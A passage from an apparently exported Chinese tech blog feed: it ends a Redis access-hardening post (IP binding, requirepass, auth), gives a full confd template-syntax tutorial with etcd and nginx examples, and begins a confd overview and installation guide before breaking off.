<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># If you want you can bind a single interface, if the bind option is not</span><br><span class="line"># specified all the interfaces will listen for incoming connections.</span><br><span class="line">#</span><br><span class="line"># bind 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>把# bind 127.0.0.1前面的 注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问</p>
<p>这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path/redis.conf 即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。</p>
<h4 id="方法二：设置密码，以提供远程登陆"><a href="#方法二：设置密码，以提供远程登陆" class="headerlink" title="方法二：设置密码，以提供远程登陆"></a><strong>方法二：设置密码，以提供远程登陆</strong></h4><p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">requirepass yourpassword</span><br><span class="line"><span class="meta">#</span><span class="bash"> yourpassword就是redis验证密码，*设置密码以后发现可以登陆，但是无法执行命令了。</span></span><br></pre></td></tr></table></figure>

<p>命令如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h yourIp -p yourPort//启动redis客户端，并连接服务器</span><br><span class="line">keys * //输出服务器中的所有key</span><br></pre></td></tr></table></figure>

<p><em>报错如下(error) ERR operation not permitted</em></p>
<p>这时候你可以用授权命令进行授权，就不报错了</p>
<p>命令如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auth youpassword</span><br></pre></td></tr></table></figure>

<p>另外，在连接服务器的时候就可以指定登录密码，避免单独输入上面授权命令</p>
<p>命令如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h  yourIp-p yourPort  -a youPassword</span><br></pre></td></tr></table></figure>

<p> 除了在配置文件redis.conf中配置验证密码以外，也可以在已经启动的redis服务器通过命令行设置密码，但这种方式是临时的，当服务器重启了密码必须重设。命令行设置密码方式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">config set requirepass yourPassword</span><br></pre></td></tr></table></figure>

<p> 有时候我们不知道当前redis服务器是否有设置验证密码，或者忘记了密码是什么，我们可以通过命令行输入命令查看密码，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config get requirepass</span><br></pre></td></tr></table></figure>

<p> 如果redis服务端没有配置密码，会得到nil，而如果配置了密码，但是redis客户端连接redis服务端时，没有用密码登录验证，会提示：operation not permitted,这时候可以用命令：auth yourpassword 进行验证密码，再执行 config set requirepass，就会显示yourpassword</p>
<p>由于redis并发能力极强，仅仅搞密码，攻击者可能在短期内发送大量猜密码的请求，很容易暴力破解，所以建议密码越长越好，比如20位。（密码在 conf文件里是明文，所以不用担心自己会忘记）</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>confd模板语法详解</title>
    <url>/articles/9d4187fa.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详细介绍了confd模板的语法和结构。并且在结尾给出示例演示，帮助你充分理解好消化。</p>
<a id="more"></a>

<h2 id="模板源"><a href="#模板源" class="headerlink" title="模板源"></a>模板源</h2><p>模板源以TOML编写并已 <strong>.toml</strong> 作为后缀的来定义的。默认情况下，模板源存储在<code>/etc/confd/conf.d</code> 目录下。</p>
<h4 id="必要参数"><a href="#必要参数" class="headerlink" title="必要参数"></a>必要参数</h4><ul>
<li><code>dest</code> （字符串） - 目标文件。</li>
<li><code>keys</code> （字符串数组） - 键数组。</li>
<li><code>src</code> （字符串） - <a href="https://github.com/kelseyhightower/confd/blob/master/docs/templates.md" target="_blank" rel="noopener">配置模板</a>的相对路径  。</li>
</ul>
<h4 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h4><ul>
<li><code>gid</code> （int） - 应该拥有该文件的gid。默认为有效的gid。</li>
<li><code>mode</code> （字符串） - 文件的权限模式。</li>
<li><code>uid</code> （int） - 应该拥有该文件的uid。默认为有效的uid。</li>
<li><code>reload_cmd</code> （字符串） - 重新加载配置的命令。</li>
<li><code>check_cmd</code> （字符串）- 检查配置的命令。</li>
<li><code>prefix</code> （字符串） - 键前缀的字符串。</li>
</ul>
<h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>使用该  <code>reload_cmd</code> 功能时，命令自行退出非常重要。reload命令不由confd管理，并将阻止配置运行直到它退出。</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[template]</span><br><span class="line">src = "nginx.conf.tmpl"</span><br><span class="line">dest = "/etc/nginx/nginx.conf"</span><br><span class="line">uid = 0</span><br><span class="line">gid = 0</span><br><span class="line">mode = "0644"</span><br><span class="line">keys = [</span><br><span class="line">  "/nginx",</span><br><span class="line">]</span><br><span class="line">check_cmd = "/usr/sbin/nginx -t -c &#123;&#123;.src&#125;&#125;"</span><br><span class="line">reload_cmd = "/usr/sbin/service nginx restart"</span><br></pre></td></tr></table></figure>

<p>模板定义单个应用程序配置模板。默认情况下，模板存储在<code>/etc/confd/templates</code>  目录下。</p>
<p>模板是用Go编写的  <a href="http://golang.org/pkg/text/template/" target="_blank" rel="noopener">模板格式</a>。</p>
<h2 id="模板函数"><a href="#模板函数" class="headerlink" title="模板函数"></a>模板函数</h2><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>创建接口和字符串的键值映射</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;$endpoint := map "name" "elasticsearch" "private_port" 9200 "public_port" 443&#125;&#125;</span><br><span class="line"></span><br><span class="line">name: &#123;&#123;index $endpoint "name"&#125;&#125;</span><br><span class="line">private-port: &#123;&#123;index $endpoint "private_port"&#125;&#125;</span><br><span class="line">public-port: &#123;&#123;index $endpoint "public_port"&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果您是子模板并且想要向其传递多个值，则特别有用。</p>
<h4 id="base"><a href="#base" class="headerlink" title="base"></a>base</h4><p><a href="https://golang.org/pkg/path/#Base" target="_blank" rel="noopener">path.Base</a>函数的别名  。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;with get "/key"&#125;&#125;</span><br><span class="line">    key: &#123;&#123;base .Key&#125;&#125;</span><br><span class="line">    value: &#123;&#123;.Value&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h4><p>判断键是否存在。如果找不到键，则返回false。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;if exists "/key"&#125;&#125;</span><br><span class="line">    value: &#123;&#123;getv "/key"&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>返回键<strong>与其键匹配</strong>的键值对。如果未找到键，则返回错误。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;with get "/key"&#125;&#125;</span><br><span class="line">    key: &#123;&#123;.Key&#125;&#125;</span><br><span class="line">    value: &#123;&#123;.Value&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h4><p>返回<strong>与其key匹配所有</strong>键值对，如果未找到键，则返回错误。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range gets "/*"&#125;&#125;</span><br><span class="line">    key: &#123;&#123;.Key&#125;&#125;</span><br><span class="line">    value: &#123;&#123;.Value&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getv"><a href="#getv" class="headerlink" title="getv"></a>getv</h4><p>返回与其键或可选的默认值匹配的字符串，如果未找到键且未给出默认值，则返回错误。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">value: &#123;&#123;getv "/key"&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getv默认值"><a href="#getv默认值" class="headerlink" title="getv默认值"></a>getv默认值</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">value: &#123;&#123;getv "/key" "default_value"&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getvs"><a href="#getvs" class="headerlink" title="getvs"></a>getvs</h4><p>返回与其键匹配所有值的字符串，如果未找到密钥，则返回错误。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range getvs "/*"&#125;&#125;</span><br><span class="line">    value: &#123;&#123;.&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h4><p>返回在<a href="https://golang.org/pkg/os/#Getenv" target="_blank" rel="noopener">os.Getenv</a> 中检索由键命名的环境变量的值。如果变量不存在，该值将为空。（可选）您可以提供一个默认值，如果该键不存在，将返回该值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export HOSTNAME=`hostname`</span><br><span class="line">hostname: &#123;&#123;getenv &quot;HOSTNAME&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getenv默认值"><a href="#getenv默认值" class="headerlink" title="getenv默认值"></a>getenv默认值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipaddr: &#123;&#123;getenv &quot;HOST_IP&quot; &quot;127.0.0.1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="datetime"><a href="#datetime" class="headerlink" title="datetime"></a>datetime</h4><p>是<a href="https://golang.org/pkg/time/#Now" target="_blank" rel="noopener">time.Now</a>的别名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Generated by confd &#123;&#123;datetime&#125;&#125;</span><br><span class="line">输出：</span><br><span class="line">Generated by confd 2015-01-23 13:34:56.093250283 -0800 PST</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Generated by confd &#123;&#123;datetime.Format "Jan 2, 2006 at 3:04pm (MST)"&#125;&#125;</span><br><span class="line">输出：</span><br><span class="line">Generated by confd Jan 23, 2015 at 1:34pm (EST)</span><br></pre></td></tr></table></figure>

<p>更多用法，请参阅<a href="http://golang.org/pkg/time/" target="_blank" rel="noopener">官方时间用法</a>。</p>
<h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>包装器  <a href="http://golang.org/pkg/strings/#Split" target="_blank" rel="noopener">strings.Split</a>。分隔输入的字符串并返回一个子字符串切片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123; $url := split (getv "/deis/service") ":" &#125;&#125;</span><br><span class="line">    host: &#123;&#123;index $url 0&#125;&#125;</span><br><span class="line">    port: &#123;&#123;index $url 1&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="toUpper"><a href="#toUpper" class="headerlink" title="toUpper"></a>toUpper</h4><p><a href="http://golang.org/pkg/strings/#ToUpper" target="_blank" rel="noopener">strings.ToUpper的</a> 别名   返回大写字符串。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: &#123;&#123;toUpper "value"&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="toLower"><a href="#toLower" class="headerlink" title="toLower"></a>toLower</h4><p><a href="http://golang.org/pkg/strings/#ToLower" target="_blank" rel="noopener">strings.ToLower的</a> 别名  。返回小写字符串。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: &#123;&#123;toLower "Value"&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="json"><a href="#json" class="headerlink" title="json"></a>json</h4><p>返回map[string]interface{}形式的json值。</p>
<h4 id="lookupSRV"><a href="#lookupSRV" class="headerlink" title="lookupSRV"></a>lookupSRV</h4><p><a href="https://golang.org/pkg/net/#LookupSRV" target="_blank" rel="noopener">net.LookupSRV</a> 包装器  。通过组合net.SRV结构的所有字段按字母顺序对SRV记录进行排序，以减少不必要的配置重新加载。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range lookupSRV "mail" "tcp" "example.com"&#125;&#125;</span><br><span class="line">  target: &#123;&#123;.Target&#125;&#125;</span><br><span class="line">  port: &#123;&#123;.Port&#125;&#125;</span><br><span class="line">  priority: &#123;&#123;.Priority&#125;&#125;</span><br><span class="line">  weight: &#123;&#123;.Weight&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="etcd添加键值"><a href="#etcd添加键值" class="headerlink" title="etcd添加键值"></a>etcd添加键值</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">etcdctl set /services/zookeeper/host1 '&#123;"Id":"host1", "IP":"192.168.10.11"&#125;'</span><br><span class="line">etcdctl set /services/zookeeper/host2 '&#123;"Id":"host2", "IP":"192.168.10.12"&#125;'</span><br></pre></td></tr></table></figure>

<h4 id="创建模板源"><a href="#创建模板源" class="headerlink" title="创建模板源"></a>创建模板源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[template]</span><br><span class="line">src = "services.conf.tmpl"</span><br><span class="line">dest = "/tmp/services.conf"</span><br><span class="line">keys = [</span><br><span class="line">  "/services/zookeeper/"</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="创建模板"><a href="#创建模板" class="headerlink" title="创建模板"></a>创建模板</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range gets "/services/zookeeper/*"&#125;&#125;</span><br><span class="line">&#123;&#123;$data := json .Value&#125;&#125;</span><br><span class="line">  id: &#123;&#123;$data.Id&#125;&#125;</span><br><span class="line">  ip: &#123;&#123;$data.IP&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="map遍历"><a href="#map遍历" class="headerlink" title="map遍历"></a>map遍历</h4><p>一旦解析了JSON，就可以使用普通的Go模板函数遍历它  <code>index</code>。</p>
<p>更高级的结构，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "animals": [</span><br><span class="line">    &#123;"type": "dog", "name": "Fido"&#125;,</span><br><span class="line">    &#123;"type": "cat", "name": "Misse"&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它可以像这样遍历：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;$data := json (getv "/test/data/")&#125;&#125;</span><br><span class="line">type: &#123;&#123; (index $data.animals 1).type &#125;&#125;</span><br><span class="line">name: &#123;&#123; (index $data.animals 1).name &#125;&#125;</span><br><span class="line">&#123;&#123;range $data.animals&#125;&#125;</span><br><span class="line">&#123;&#123;.name&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="jsonArray"><a href="#jsonArray" class="headerlink" title="jsonArray"></a>jsonArray</h4><p>从接口返回json数组，例如： [“a”, “b”, “c”]`。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range jsonArray (getv "/services/data/")&#125;&#125;</span><br><span class="line">	val: &#123;&#123;.&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>返回匹配路径的所有子键，字符串等。如果找不到路径，则返回空列表。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range ls "/deis/services"&#125;&#125;</span><br><span class="line">   value: &#123;&#123;.&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="lsdir"><a href="#lsdir" class="headerlink" title="lsdir"></a>lsdir</h4><p>返回匹配路径的所有子键，字符串等。注意它只返回也有子键的子键。如果找不到路径，则返回空列表。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range lsdir "/deis/services"&#125;&#125;</span><br><span class="line">   value: &#123;&#123;.&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>返回制定键的父目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;with dir "/services/data/url"&#125;&#125;</span><br><span class="line">	dir: &#123;&#123;.&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p><a href="https://golang.org/pkg/strings/#Join" target="_blank" rel="noopener">strings.Join</a> 函数的别名  。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;$services := getvs "/services/elasticsearch/*"&#125;&#125;</span><br><span class="line">services: &#123;&#123;join $services ","&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p><a href="https://golang.org/pkg/strings/#Replace" target="_blank" rel="noopener">strings.place</a> 函数的别名  。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;$backend := getv "/services/backend/nginx"&#125;&#125;</span><br><span class="line">backend = &#123;&#123;replace $backend "-" "_" -1&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="lookupIP"><a href="#lookupIP" class="headerlink" title="lookupIP"></a>lookupIP</h4><p><a href="https://golang.org/pkg/net/#LookupIP" target="_blank" rel="noopener">net.LookupIP</a>  函数的包装器  。包装器还按字母顺序排序IP地址。这一点至关重要，因为在动态环境中，DNS服务器通常会混淆链接到域名的地址。这将导致不必要的配置重新加载。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range lookupIP "some.host.local"&#125;&#125;</span><br><span class="line">    server &#123;&#123;.&#125;&#125;;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">etcdctl set /nginx/domain 'example.com'</span><br><span class="line">etcdctl set /nginx/root '/var/www/example_dotcom'</span><br><span class="line">etcdctl set /nginx/worker_processes '2'</span><br><span class="line">etcdctl set /app/upstream/app1 "10.0.1.100:80"</span><br><span class="line">etcdctl set /app/upstream/app2 "10.0.1.101:80"</span><br><span class="line"></span><br><span class="line">cat /etc/confd/templates/nginx.conf.tmpl</span><br><span class="line"></span><br><span class="line">  worker_processes &#123;&#123;getv "/nginx/worker_processes"&#125;&#125;;</span><br><span class="line"></span><br><span class="line">  upstream app &#123;</span><br><span class="line">  &#123;&#123;range getvs "/app/upstream/*"&#125;&#125;</span><br><span class="line">      server &#123;&#123;.&#125;&#125;;</span><br><span class="line">  &#123;&#123;end&#125;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">      listen 80;</span><br><span class="line">      server_name www.&#123;&#123;getv "/nginx/domain"&#125;&#125;;</span><br><span class="line">      access_log /var/log/nginx/&#123;&#123;getv "/nginx/domain"&#125;&#125;.access.log;</span><br><span class="line">      error_log /var/log/nginx/&#123;&#123;getv "/nginx/domain"&#125;&#125;.log;</span><br><span class="line"></span><br><span class="line">      location / &#123;</span><br><span class="line">          root              &#123;&#123;getv "/nginx/root"&#125;&#125;;</span><br><span class="line">          index             index.html index.htm;</span><br><span class="line">          proxy_pass        http://app;</span><br><span class="line">          proxy_redirect    off;</span><br><span class="line">          proxy_set_header  Host             $host;</span><br><span class="line">          proxy_set_header  X-Real-IP        $remote_addr;</span><br><span class="line">          proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>输出： <code>/etc/nginx/nginx.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">worker_processes 2;</span><br><span class="line"></span><br><span class="line">upstream app &#123;</span><br><span class="line">    server 10.0.1.100:80;</span><br><span class="line">    server 10.0.1.101:80;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.example.com;</span><br><span class="line">    access_log /var/log/nginx/example.com.access.log;</span><br><span class="line">    error_log /var/log/nginx/example.com.error.log;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root              /var/www/example_dotcom;</span><br><span class="line">        index             index.html index.htm;</span><br><span class="line">        proxy_pass        http://app;</span><br><span class="line">        proxy_redirect    off;</span><br><span class="line">        proxy_set_header  Host             $host;</span><br><span class="line">        proxy_set_header  X-Real-IP        $remote_addr;</span><br><span class="line">        proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="复杂的例子"><a href="#复杂的例子" class="headerlink" title="复杂的例子"></a>复杂的例子</h3><p>此示例显示如何使用模板函数的组合来执行嵌套迭代。</p>
<h4 id="到etcd添加键"><a href="#到etcd添加键" class="headerlink" title="到etcd添加键"></a>到etcd添加键</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">etcdctl mkdir /services/web/cust1/</span><br><span class="line">etcdctl mkdir /services/web/cust2/</span><br><span class="line">etcdctl set /services/web/cust1/2 '&#123;"IP": "10.0.0.2"&#125;'</span><br><span class="line">etcdctl set /services/web/cust2/2 '&#123;"IP": "10.0.0.4"&#125;'</span><br><span class="line">etcdctl set /services/web/cust2/1 '&#123;"IP": "10.0.0.3"&#125;'</span><br><span class="line">etcdctl set /services/web/cust1/1 '&#123;"IP": "10.0.0.1"&#125;'</span><br></pre></td></tr></table></figure>

<h4 id="创建模板源-1"><a href="#创建模板源-1" class="headerlink" title="创建模板源"></a>创建模板源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[template]</span><br><span class="line">src = "services.conf.tmpl"</span><br><span class="line">dest = "/tmp/services.conf"</span><br><span class="line">keys = [</span><br><span class="line">  "/services/web"</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="创建模板-1"><a href="#创建模板-1" class="headerlink" title="创建模板"></a>创建模板</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;range $dir := lsdir "/services/web"&#125;&#125;</span><br><span class="line">upstream &#123;&#123;base $dir&#125;&#125; &#123;</span><br><span class="line">    &#123;&#123;$custdir := printf "/services/web/%s/*" $dir&#125;&#125;&#123;&#123;range gets $custdir&#125;&#125;</span><br><span class="line">    server &#123;&#123;$data := json .Value&#125;&#125;&#123;&#123;$data.IP&#125;&#125;:80;</span><br><span class="line">    &#123;&#123;end&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    server_name &#123;&#123;base $dir&#125;&#125;.example.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass &#123;&#123;base $dir&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>输出：<code>/tmp/services.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">upstream cust1 &#123;</span><br><span class="line">    server 10.0.0.1:80;</span><br><span class="line">    server 10.0.0.2:80;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    server_name cust1.example.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass cust1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upstream cust2 &#123;</span><br><span class="line">    server 10.0.0.3:80;</span><br><span class="line">    server 10.0.0.4:80;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    server_name cust2.example.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass cust2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>自动化</category>
      </categories>
      <tags>
        <tag>Confd</tag>
      </tags>
  </entry>
  <entry>
    <title>confd配置管理工具详解</title>
    <url>/articles/8013785a.html</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>当系统变的复杂，配置项越来越多，一方面配置管理变得繁琐，另一方面配置修改后需要重新上线同样十分痛苦。这时候，需要有一套集中化配置管理系统，一方面提供统一的配置管理，另一方面提供配置变更的自动下发，及时生效。提到统一配置管理系统，大家应该比较熟悉，常见的：zookeeper、etcd、consul、git等等。上述的集中配置中心使用的时候，部署图大致是这样的：</p>
<p><img src="/articles/8013785a/1.png" alt></p>
<p>server端只需要调用config-server对应客户端获取配置，和监听配置变更就可以了。总体来说没有太大难度。</p>
<p>接下来要说一下confd，它提供了一种新的集成思路。confd的存在有点类似于快递员，买了东西不需要自己到店去取货了，confd这个快递员会把货取过来，然后送到家里，并且通知你货已经送到了。加入confd之后的架构大致是这样的：</p>
<p><img src="/articles/8013785a/2.png" alt></p>
<a id="more"></a>

<h2 id="confd工作原理"><a href="#confd工作原理" class="headerlink" title="confd工作原理"></a>confd工作原理</h2><p>confd使用时有几个概念需要熟悉，并且熟悉他们之间的依赖关系，才能理解如何配置confd，不然会比较懵。这里我们先看一下confd配置的几个概念之间是如何交互的：</p>
<p><img src="/articles/8013785a/3.png" alt></p>
<h2 id="confd的部署"><a href="#confd的部署" class="headerlink" title="confd的部署"></a>confd的部署</h2><p>以Linux系统为例。<a href="https://github.com/kelseyhightower/confd/releases" target="_blank" rel="noopener">官方下载地址</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载二进制文件</span></span><br><span class="line">wget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重命名二进制文件，并移动到PATH的目录下</span></span><br><span class="line">mv confd-0.16.0-linux-amd64 /usr/local/bin/confd</span><br><span class="line">chmod +x /usr/local/bin/confd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证是否安装成功</span></span><br><span class="line">confd --help</span><br></pre></td></tr></table></figure>

<h2 id="confd的配置"><a href="#confd的配置" class="headerlink" title="confd的配置"></a>confd的配置</h2><p><strong>详情参考：</strong><a href="https://wandouduoduo.github.io/articles/9d4187fa.html#more" target="_blank" rel="noopener">confd模板语法详解</a></p>
<p><code>Confd</code>通过读取后端存储的配置信息来动态更新对应的配置文件，对应的后端存储可以是<code>etcd</code>，<code>redis</code>等，其中etcd的v3版本对应的存储后端为<code>etcdv3</code>。</p>
<h4 id="创建confdir"><a href="#创建confdir" class="headerlink" title="创建confdir"></a>创建confdir</h4><p>confdir底下包含两个目录:</p>
<ul>
<li><code>conf.d</code>:  confd的配置文件，主要包含配置的生成逻辑，例如模板源，后端存储对应的keys，命令执行等。</li>
<li><code>templates</code>:  配置模板Template，即基于不同组件的配置，修改为符合 <a href="http://golang.org/pkg/text/template/#pkg-overview" target="_blank" rel="noopener">Golang text templates</a>的模板文件。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/confd/&#123;conf.d,templates&#125;</span><br></pre></td></tr></table></figure>

<h4 id="模板源"><a href="#模板源" class="headerlink" title="模板源"></a>模板源</h4><p>模板源配置文件是<code>TOML</code>格式的文件，主要包含配置的生成逻辑，例如模板源，后端存储对应的keys，命令执行等。默认目录在<code>/etc/confd/conf.d</code>。</p>
<p><strong>必要参数</strong></p>
<ul>
<li><code>dest</code> （字符串） - 目标文件。</li>
<li><code>keys</code> （字符串数组） - 键数组。</li>
<li><code>src</code> （字符串） - <a href="https://github.com/kelseyhightower/confd/blob/master/docs/templates.md" target="_blank" rel="noopener">配置模板</a>的相对路径  。</li>
</ul>
<p><strong>可选参数</strong></p>
<ul>
<li><code>gid</code> （int） - 应该拥有该文件的gid。默认为有效的gid。</li>
<li><code>mode</code> （字符串） - 文件的权限模式。</li>
<li><code>uid</code> （int） - 应该拥有该文件的uid。默认为有效的uid。</li>
<li><code>reload_cmd</code> （字符串） - 重新加载配置的命令。</li>
<li><code>check_cmd</code> （字符串） - 检查配置的命令。</li>
<li><code>prefix</code> （字符串） - 键前缀的字符串。</li>
</ul>
<p><strong>例子</strong></p>
